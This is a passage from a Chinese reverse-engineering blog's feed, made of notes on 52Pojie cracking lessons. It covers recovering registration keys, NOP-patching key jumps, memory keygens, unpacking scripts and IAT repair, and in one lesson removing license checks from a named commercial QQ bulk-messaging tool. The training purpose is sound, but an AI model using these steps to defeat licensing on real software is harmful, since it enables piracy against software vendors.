32 55 58 4A<br>  <a href="https://i.loli.net/2018/07/14/5b49f5ef10e71.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5ef10e71.jpg" class="lazyload"></a></p><ol start="3"><li>HKEY_CURRENT_USER\Software\52Pojie：confirm  3MjM2UXJ4abc</li></ol><p>Ctrl+N 找RegQueryValueExA，查找输入函数参考，找到比较注册码的算法。</p><p>首先，倒推出真实注册码的长度为12。</p><p>然后，倒推出第5位为的值为0x32(0x66异或0x54)的结果，第9位是0x34，第1位是0x33</p><p>再然后，发现字符串比较，得出第2-4位为MJM，第6-8位为UXJ。</p><p>最后，发现长度不够，随便补了3位。<br>  <a href="https://i.loli.net/2018/07/14/5b49f5ef23867.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5ef23867.jpg" class="lazyload"></a>)<a href="https://i.loli.net/2018/07/14/5b49f5fc740ec.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5fc740ec.jpg" class="lazyload"></a><br>  <a href="https://i.loli.net/2018/07/14/5b49f5fc88337.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5fc88337.jpg" class="lazyload"></a></p><p>4.再打开程序就出现彩蛋提示。<br>  <a href="https://i.loli.net/2018/07/14/5b49f5fc9b127.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5fc9b127.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证&quot;&gt;&lt;a href=&quot;#吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="吾爱破解培训" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="脱壳，重启验证" scheme="https://kabeor.github.io/tags/%E8%84%B1%E5%A3%B3%EF%BC%8C%E9%87%8D%E5%90%AF%E9%AA%8C%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解培训第八课：短兵相接--深入浅出探讨脱壳细节（上）</title>
    <link href="https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E5%85%AB%E8%AF%BE%EF%BC%9A%E7%9F%AD%E5%85%B5%E7%9B%B8%E6%8E%A5--%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E6%8E%A2%E8%AE%A8%E8%84%B1%E5%A3%B3%E7%BB%86%E8%8A%82%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E5%85%AB%E8%AF%BE%EF%BC%9A%E7%9F%AD%E5%85%B5%E7%9B%B8%E6%8E%A5--%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E6%8E%A2%E8%AE%A8%E8%84%B1%E5%A3%B3%E7%BB%86%E8%8A%82%EF%BC%88%E4%B8%8A%EF%BC%89/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:36:06.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱破解培训第八课：短兵相接–深入浅出探讨脱壳细节（上）"><a href="#吾爱破解培训第八课：短兵相接–深入浅出探讨脱壳细节（上）" class="headerlink" title="吾爱破解培训第八课：短兵相接–深入浅出探讨脱壳细节（上）"></a>吾爱破解培训第八课：短兵相接–深入浅出探讨脱壳细节（上）</h1><p>调试器（反调试）</p><p>被脱壳的文件</p><p>OEP（偷OEP,藏OEP）</p><p>dump(.bss)</p><p>修复iat()</p><blockquote><p>IAT （导入地址表）</p></blockquote><p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中.当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。</p><blockquote><p>IAT重建</p></blockquote><p>使用的工具有 LoadPE 和 ImportREC。 </p><blockquote><p>PE结构</p></blockquote><p><a href="http://note.youdao.com/noteshare?id=a48355ff968c2e896fd14246eafb24b4&sub=WEB69b5c47a68ca69808b86055c8b085515" target="_blank" rel="noopener">PE简介</a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;吾爱破解培训第八课：短兵相接–深入浅出探讨脱壳细节（上）&quot;&gt;&lt;a href=&quot;#吾爱破解培训第八课：短兵相接–深入浅出探讨脱壳细节（上）&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="吾爱破解培训" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="脱壳" scheme="https://kabeor.github.io/tags/%E8%84%B1%E5%A3%B3/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解培训第六课：潜伏在程序身边的黑影--实战给程序补丁</title>
    <link href="https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E5%85%AD%E8%AF%BE%EF%BC%9A%E6%BD%9C%E4%BC%8F%E5%9C%A8%E7%A8%8B%E5%BA%8F%E8%BA%AB%E8%BE%B9%E7%9A%84%E9%BB%91%E5%BD%B1--%E5%AE%9E%E6%88%98%E7%BB%99%E7%A8%8B%E5%BA%8F%E8%A1%A5%E4%B8%81/"/>
    <id>https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E5%85%AD%E8%AF%BE%EF%BC%9A%E6%BD%9C%E4%BC%8F%E5%9C%A8%E7%A8%8B%E5%BA%8F%E8%BA%AB%E8%BE%B9%E7%9A%84%E9%BB%91%E5%BD%B1--%E5%AE%9E%E6%88%98%E7%BB%99%E7%A8%8B%E5%BA%8F%E8%A1%A5%E4%B8%81/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:36:26.319Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱破解培训第六课：潜伏在程序身边的黑影–实战给程序补丁"><a href="#吾爱破解培训第六课：潜伏在程序身边的黑影–实战给程序补丁" class="headerlink" title="吾爱破解培训第六课：潜伏在程序身边的黑影–实战给程序补丁"></a>吾爱破解培训第六课：潜伏在程序身边的黑影–实战给程序补丁</h1><blockquote><p>吾爱破解内存补丁生成器V1.00:作程序补丁</p></blockquote><p><a href="https://i.loli.net/2018/07/14/5b49f6159b19e.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f6159b19e.jpg" class="lazyload"></a></p><p>1.拖入需要补丁的文件</p><p>2.输入需要修改位置的内存地址</p><p>3.输入要改成的指令的机器码</p><p>4.添加指令</p><p>5.导出补丁</p><blockquote><p>KeyMake V2.0 修改版:做内存注册机</p></blockquote><p><a href="https://i.loli.net/2018/07/14/5b49f615acf6b.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f615acf6b.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/14/5b49f615cf229.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f615cf229.jpg" class="lazyload"></a></p><p>中断地址为真正注册注册码地址</p><p>选择内存方式，选择相应寄存器</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><blockquote><p>一.内存补丁</p></blockquote><p>1.首先查壳&gt;&gt;vmp壳<br>2.运行程序点击注册看看是否有关键提示信息<br>3.OD载入程序,F9运行程序  Ctrl+G 输入00401000后确定Ctrl+A分析代码<br>4.搜索中文字符串 Ctrl+F 查找”注册失败”<br>5.找到后双击”注册失败”来到反汇编窗口,往上找到跳过注册失败的跳转</p><p>0040346B  |. /75 07         jnz X00403474                            ;  这里是关键跳转  jnz修改为nop   也就是把75 07 修改为90 90<br>0040346D  |. |68 80E15700   push 0057E180                            ;  注册成功<br>00403472  |. |EB 10         jmp X00403484<br>00403474  |&gt; \68 8CE15700   push 0057E18C                            ;  注册失败  双击后来到这里往上找到关键跳</p><blockquote><p>二.内存注册机.</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.OD载入程序,F9运行程序  Ctrl+G 输入00401000后确定   Ctrl+A分析代码</span><br><span class="line">2.搜索中文字符串 Ctrl+F 查找&quot;注册失败&quot;</span><br><span class="line">3.找到后双击&quot;注册失败&quot;来到反汇编窗口,往上找到断首,在断首处下F2断点</span><br><span class="line">4.然后F9运行程序输入用户名和key.点击注册后会断在刚才F2的断点处,然后一直F8单步跟踪,然后注意看各个寄存器的值是否有出现正确key</span><br><span class="line">5.当其中一个寄存器出现正确的key时  此时反汇编窗口的地址就是我们写内存注册机的 内存地址.</span><br><span class="line">6.运行到该地址时:</span><br><span class="line">   00403436  |.  8B4D E8       mov ecx,[local.6]  此时esi的值已经出现了我们的正确key   </span><br><span class="line">我们就可以取该内存地址: 00403436 做为写内存注册机的内存地址</span><br><span class="line">如下:</span><br><span class="line">内存地址: 00403436</span><br><span class="line">中断次数: 1</span><br><span class="line">第一字节: 8B</span><br><span class="line">指令长度: 1</span><br></pre></td></tr></table></figure></div><p>也可以取下面这里做为内存注册机的地址<br>此处的代码寄存器EAX的值也是正确的key.</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00403440  |&gt;  8A10          &#x2F;mov dl,byte ptr ds:[eax]   ;  此时EAX的值已经出现正确key</span><br><span class="line">00403442  |. |3A11          |cmp dl,byte ptr ds:[ecx]   ;  下面代码部分是真key和假key对比</span><br><span class="line">00403444  |. |75 1A         |jnz X00403460</span><br><span class="line">00403446  |. |84D2          |test dl,dl</span><br><span class="line">00403448  |. |74 12         |je X0040345C</span><br><span class="line">0040344A  |. |8A50 01       |mov dl,byte ptr ds:[eax+0x1]</span><br><span class="line">0040344D  |. |3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]</span><br><span class="line">00403450  |. |75 0E         |jnz X00403460</span><br><span class="line">00403452  |. |83C0 02       |add eax,0x2</span><br><span class="line">00403455  |. |83C1 02       |add ecx,0x2</span><br><span class="line">00403458  |. |84D2          |test dl,dl</span><br><span class="line">0040345A  |.^\75 E4         \jnz X00403440</span><br><span class="line"></span><br><span class="line">内存地址: 00403440</span><br><span class="line">中断次数: 1</span><br><span class="line">第一字节: 8A</span><br><span class="line">指令长度: 1</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;吾爱破解培训第六课：潜伏在程序身边的黑影–实战给程序补丁&quot;&gt;&lt;a href=&quot;#吾爱破解培训第六课：潜伏在程序身边的黑影–实战给程序补丁&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="吾爱破解培训" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="脱壳，补丁" scheme="https://kabeor.github.io/tags/%E8%84%B1%E5%A3%B3%EF%BC%8C%E8%A1%A5%E4%B8%81/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解培训第十课：探寻逆向新航标---x64平台脱壳与破解实战</title>
    <link href="https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E5%8D%81%E8%AF%BE%EF%BC%9A%E6%8E%A2%E5%AF%BB%E9%80%86%E5%90%91%E6%96%B0%E8%88%AA%E6%A0%87---x64%E5%B9%B3%E5%8F%B0%E8%84%B1%E5%A3%B3%E4%B8%8E%E7%A0%B4%E8%A7%A3%E5%AE%9E%E6%88%98/"/>
    <id>https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E5%8D%81%E8%AF%BE%EF%BC%9A%E6%8E%A2%E5%AF%BB%E9%80%86%E5%90%91%E6%96%B0%E8%88%AA%E6%A0%87---x64%E5%B9%B3%E5%8F%B0%E8%84%B1%E5%A3%B3%E4%B8%8E%E7%A0%B4%E8%A7%A3%E5%AE%9E%E6%88%98/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:36:41.876Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱破解培训第十课：探寻逆向新航标—x64平台脱壳与破解实战"><a href="#吾爱破解培训第十课：探寻逆向新航标—x64平台脱壳与破解实战" class="headerlink" title="吾爱破解培训第十课：探寻逆向新航标—x64平台脱壳与破解实战"></a>吾爱破解培训第十课：探寻逆向新航标—x64平台脱壳与破解实战</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  AL</span><br><span class="line">AH</span><br><span class="line">AX..</span><br><span class="line">EAX.....</span><br><span class="line">RAX.............</span><br><span class="line">0000000000401000</span><br><span class="line">  R8b  byte</span><br><span class="line">R8w.   word</span><br><span class="line">R8d.....   dword</span><br><span class="line">R8..............   qword</span><br></pre></td></tr></table></figure></div><p>ESP定律</p><p>应用堆栈平衡找到pop</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push rdi    </span><br><span class="line">push rsi    </span><br><span class="line">push rbx    </span><br><span class="line">push rcx    </span><br><span class="line">push rdx    </span><br><span class="line">push r8     </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">pop r8</span><br><span class="line">pop rdx</span><br><span class="line">pop rcx</span><br><span class="line">pop rbx</span><br><span class="line">pop rsi</span><br><span class="line">pop rdi</span><br><span class="line">41585A595B5E5F</span><br><span class="line"></span><br><span class="line">pop r15</span><br><span class="line">pop r14</span><br><span class="line">pop r13</span><br><span class="line">pop r12</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br><span class="line">pop rbp</span><br><span class="line">pop rbx</span><br><span class="line">ret    </span><br><span class="line">415F415E415D415C5F5E5D5BC3</span><br></pre></td></tr></table></figure></div><blockquote><p>脱壳脚本</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find rip,&quot;415F415E415D415C5F5E5D5BC3&quot;</span><br><span class="line">mov first_jmp,$result</span><br><span class="line">add first_jmp, D</span><br><span class="line">bp first_jmp</span><br><span class="line">erun</span><br><span class="line">bc</span><br><span class="line">sti</span><br><span class="line">find rip,&quot;41585A595B5E5F&quot;</span><br><span class="line">mov second_jmp,$result</span><br><span class="line">add second_jmp,7</span><br><span class="line">bp second_jmp</span><br><span class="line">erun</span><br><span class="line">sti</span><br><span class="line">msg &quot;This is oep&quot;</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div><h1 id="实例破解"><a href="#实例破解" class="headerlink" title="实例破解"></a>实例破解</h1><blockquote><p>爆破</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.指令起始部分:</span><br><span class="line">000000014001B0C0 | 57                       | push rdi                                |</span><br><span class="line">000000014001B0C1 | 56                       | push rsi                                |</span><br><span class="line">000000014001B0C2 | 53                       | push rbx                                |</span><br><span class="line">000000014001B0C3 | 51                       | push rcx                                |</span><br><span class="line">000000014001B0C4 | 52                       | push rdx                                |</span><br><span class="line">000000014001B0C5 | 41 50                    | push r8                                 |</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">那么指令结束部分:</span><br><span class="line">                                            | pop r8</span><br><span class="line">                                            | pop rdx</span><br><span class="line">                                            | pop rcx</span><br><span class="line">                                            | pop rbx</span><br><span class="line">                                            | pop rsi</span><br><span class="line">                                            | pop rdi</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">单步后发现指令结束部分与上面一毛一样：</span><br><span class="line">0000000140011D12 | 41 58                    | pop r8                                  |</span><br><span class="line">0000000140011D14 | 5A                       | pop rdx                                 |</span><br><span class="line">0000000140011D15 | 59                       | pop rcx                                 |</span><br><span class="line">0000000140011D16 | 5B                       | pop rbx                                 |</span><br><span class="line">0000000140011D17 | 5E                       | pop rsi                                 |</span><br><span class="line">0000000140011D18 | 5F                       | pop rdi                                 |</span><br><span class="line"></span><br><span class="line">二进制：41585A595B5E5F</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line">2.</span><br><span class="line">000000014001BB9A | 41 5F                    | pop r15                                 |</span><br><span class="line">000000014001BB9C | 41 5E                    | pop r14                                 |</span><br><span class="line">000000014001BB9E | 41 5D                    | pop r13                                 |</span><br><span class="line">000000014001BBA0 | 41 5C                    | pop r12                                 |</span><br><span class="line">000000014001BBA2 | 5F                       | pop rdi                                 |</span><br><span class="line">000000014001BBA3 | 5E                       | pop rsi                                 |</span><br><span class="line">000000014001BBA4 | 5D                       | pop rbp                                 |</span><br><span class="line">000000014001BBA5 | 5B                       | pop rbx                                 |</span><br><span class="line">000000014001BBA6 | C3                       | ret                                     |</span><br><span class="line">二进制：415F415E415D415C5F5E5D5BC3</span><br><span class="line"></span><br><span class="line">OEP：0000000140001180 | 48 83 EC 28              | sub rsp,28                              |</span><br><span class="line">search references:you failed </span><br><span class="line">0000000140001078 | 75 13                    | jnz 14000108D                           | -------------&gt;nop</span><br></pre></td></tr></table></figure></div><blockquote><p>脚本</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find rip,&quot;415F415E415D415C5F5E5D5BC3&quot;</span><br><span class="line">mov first_jmp,$result</span><br><span class="line">add first_jmp,D</span><br><span class="line">bp first_jmp</span><br><span class="line">erun</span><br><span class="line">bc</span><br><span class="line">sti</span><br><span class="line">find rip,&quot;41585A595B5E5F&quot;</span><br><span class="line">mov second_jmp,$result</span><br><span class="line">add second_jmp,7</span><br><span class="line">bp second_jmp</span><br><span class="line">erun</span><br><span class="line">sti</span><br><span class="line">msg &quot;this is oep&quot;</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></div><blockquote><p>追码</p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">破解，运行下断点 bp MessgeBoxA，输入52PoJie.Cn，check</span><br><span class="line">断在</span><br><span class="line">00007FFD1C8236A0 | sub rsp,38                              |</span><br><span class="line">00007FFD1C8236A4 | xor r11d,r11d                           |</span><br><span class="line">00007FFD1C8236A7 | cmp dword ptr ds:[7FFD1C839104],r11d    |</span><br><span class="line">00007FFD1C8236AE | je user32.7FFD1C8236DE                  |</span><br><span class="line">00007FFD1C8236B0 | mov rax,qword ptr gs:[30]      </span><br><span class="line"></span><br><span class="line">看堆栈返回到 00000001400010EB</span><br><span class="line">00000001400010E6 | E8 15 FF FF FF           | call 140001000                          |</span><br><span class="line">00000001400010EB | EB F1                    | jmp 1400010DE</span><br><span class="line"></span><br><span class="line">重载，跟进call 140001000 ，找到key的计算</span><br><span class="line"></span><br><span class="line">000000014000101B | call qword ptr ds:[&lt;&amp;GetDlgItemTextA&gt;]  |</span><br><span class="line">0000000140001021 | cmp byte ptr ds:[140015820],0           | ;比较长度是否&#x3D;0</span><br><span class="line">0000000140001028 | je 140001060                            |</span><br><span class="line">000000014000102A | lea rdx,qword ptr ds:[140015820]        | ;140015820:&quot;52KjEd&#96;.&gt;i&quot;</span><br><span class="line">0000000140001031 | mov cl,byte ptr ds:[rdx]                | ;取一字节</span><br><span class="line">0000000140001033 | lea eax,dword ptr ds:[rcx-61]           |</span><br><span class="line">0000000140001036 | cmp al,19                               | ;大于19则跳</span><br><span class="line">0000000140001038 | ja 140001042                            |</span><br><span class="line">000000014000103A | sub cl,5                                |</span><br><span class="line">000000014000103D | cmp cl,7A                               |</span><br><span class="line">0000000140001040 | jmp 14000104F                           |</span><br><span class="line">0000000140001042 | lea eax,dword ptr ds:[rcx-41]           |</span><br><span class="line">0000000140001045 | cmp al,19                               | ;大于19跳</span><br><span class="line">0000000140001047 | ja 140001058                            |</span><br><span class="line">0000000140001049 | sub cl,5                                |</span><br><span class="line">000000014000104C | cmp cl,5A                               |</span><br><span class="line">000000014000104F | mov byte ptr ds:[rdx],cl                |</span><br><span class="line">0000000140001051 | jle 140001058                           | ;小于等于7A跳</span><br><span class="line">0000000140001053 | sub cl,1A                               |</span><br><span class="line">0000000140001056 | mov byte ptr ds:[rdx],cl                |</span><br><span class="line">0000000140001058 | inc rdx                                 |</span><br><span class="line">000000014000105B | cmp byte ptr ds:[rdx],0                 |</span><br><span class="line">000000014000105E | jnz 140001031                           |</span><br><span class="line"></span><br><span class="line">计算完，比较</span><br><span class="line">0000000140001060 | lea rdx,qword ptr ds:[140015820]        | ;140015820:&quot;52KjEd&#96;.&gt;i&quot;</span><br><span class="line">0000000140001067 | lea rcx,qword ptr ds:[1400112F0]        | ;1400112F0:&quot;52PoJie.Cn&quot;</span><br><span class="line">000000014000106E | call 14000B900                          | ;与计算后的比较</span><br><span class="line">0000000140001073 | mov rcx,rbx                             |</span><br><span class="line">0000000140001076 | test eax,eax                            |</span><br><span class="line">0000000140001078 | jnz 14000108D                           | ;不等跳走</span><br><span class="line">000000014000107A | xor r9d,r9d                             |</span><br><span class="line">000000014000107D | lea r8,qword ptr ds:[1400112FC]         | ;1400112FC:&quot;Boom!&quot;</span><br><span class="line">0000000140001084 | lea rdx,qword ptr ds:[140011308]        | ;140011308:&quot;Congratulations! You have successfully Registered&quot;</span><br><span class="line">000000014000108B | jmp 1400010A1                           |</span><br><span class="line">000000014000108D | mov r9d,10                              |</span><br><span class="line">0000000140001093 | lea r8,qword ptr ds:[140011340]         | ;140011340:&quot;Boomshakalaka&quot;</span><br><span class="line">000000014000109A | lea rdx,qword ptr ds:[140011350]        | ;140011350:&quot;You Failed!&quot;</span><br><span class="line"></span><br><span class="line">通过计算得出注册码：52UtOnj.Hs</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;吾爱破解培训第十课：探寻逆向新航标—x64平台脱壳与破解实战&quot;&gt;&lt;a href=&quot;#吾爱破解培训第十课：探寻逆向新航标—x64平台脱壳与破解实战&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    <category term="吾爱破解培训" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="脱壳，x64" scheme="https://kabeor.github.io/tags/%E8%84%B1%E5%A3%B3%EF%BC%8Cx64/"/>
    
  </entry>
  
  <entry>
    <title>吾爱破解培训第四课：击破程序最坚固的堡垒--实战去程序自校验</title>
    <link href="https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E5%9B%9B%E8%AF%BE%EF%BC%9A%E5%87%BB%E7%A0%B4%E7%A8%8B%E5%BA%8F%E6%9C%80%E5%9D%9A%E5%9B%BA%E7%9A%84%E5%A0%A1%E5%9E%92--%E5%AE%9E%E6%88%98%E5%8E%BB%E7%A8%8B%E5%BA%8F%E8%87%AA%E6%A0%A1%E9%AA%8C/"/>
    <id>https://kabeor.github.io/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E5%9B%9B%E8%AF%BE%EF%BC%9A%E5%87%BB%E7%A0%B4%E7%A8%8B%E5%BA%8F%E6%9C%80%E5%9D%9A%E5%9B%BA%E7%9A%84%E5%A0%A1%E5%9E%92--%E5%AE%9E%E6%88%98%E5%8E%BB%E7%A8%8B%E5%BA%8F%E8%87%AA%E6%A0%A1%E9%AA%8C/</id>
    <published>2018-07-13T16:00:00.000Z</published>
    <updated>2020-03-16T04:36:46.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱破解培训第四课：击破程序最坚固的堡垒–实战去程序自校验"><a href="#吾爱破解培训第四课：击破程序最坚固的堡垒–实战去程序自校验" class="headerlink" title="吾爱破解培训第四课：击破程序最坚固的堡垒–实战去程序自校验"></a>吾爱破解培训第四课：击破程序最坚固的堡垒–实战去程序自校验</h1><blockquote><p>常见自校验方法</p></blockquote><p> 1.最简单的校验</p><p>最简单的校验就是把原始数据和待比较数据直接进行比较，看是否完全一样这种方法是最安全最准确的。同时也是效率最低的。</p><p> 2.CRC（Cyclic Redundancy Check，循环冗余校验）循环冗余校验</p><p>利用除法及余数的原理来作错误侦测（Error Detecting）的。实际应用时，发送装置计算出CRC值并随数据一同发送给接收装置，接收装置对收到的数据重新计算CRC并与收到的CRC相比较，若两个CRC值不同，则说明数据通讯出现错误。</p><p> 3.MD5、SHA、MAC等摘要算法</p><p> 摘要算法用于数据量比较大的场合。它通过对所有数据提取指纹信息以实现数据签名、数据完整性校验等功能，由于其不可逆性，有时候会被用做敏感信息的加密。数据摘要算法也被称为哈希（Hash）算法、散列算法。在互联网上进行大文件传输时，都要得用MD5算法产生一个与文件匹配的、存储MD5值的文本文件（后缀名为 .md5或.md5sum），这样接收者在接收到文件后，就可以利用与 SFV 类似的方法来检查文件完整性，绝大多数大型软件公司或开源组织都是以这种方式来校验数据完整性，而且部分操作系统也使用此算法来对用户密码进行加密，另外，它也是目前计算机犯罪中数据取证的最常用算法。</p><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><p>一、查壳加区段</p><p>安装豪迪QQ群发器2017.7.9版本。<br>    首先使用ExeinfoPE查壳，发现程序无壳，为Delphi编写程序，此图省略<br>    使用StudyPE增加一个qqqf区段，同时得到内存偏移地址：0062D000<br>    加区段是为了修改代码方便</p><p>二、破解注册码本地验证</p><p>首先根据小生我怕怕教程，我们知道先搜索一下UNICODE，查找 已注册版本<br>      <a href="https://i.loli.net/2018/07/14/5b49f5bc8973a.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5bc8973a.jpg" class="lazyload"></a><br>这里我们发现一处内存地址比较 0x5950CC 如果为1，则为注册版本 </p><p>于是我们查找此地址所有常量，均下断点后，逐个分析<br>      <a href="https://i.loli.net/2018/07/14/5b49f5bc9c426.jpg" data-fancybox="group" data-caption="image" class="fancybox"><img alt="image" title="image" data-src="https://i.loli.net/2018/07/14/5b49f5bc9c426.jpg" class="lazyload"></a><br>在以上查到的7处中，其中有2处为直接赋值，那么我们果断直接改为1</p><p>也就是将 </p><pre><code>mov byte ptr ds:[0x5950CC],0x0</code></pre><p>直接改为</p><pre><code>mov byte ptr ds:[0x5950CC],0x1</code></pre><p>3处CMP比较位置不做修改</p><p>剩余2处间接赋值语句在同一个代码段，通过分析处理，进行修改<br>      <a 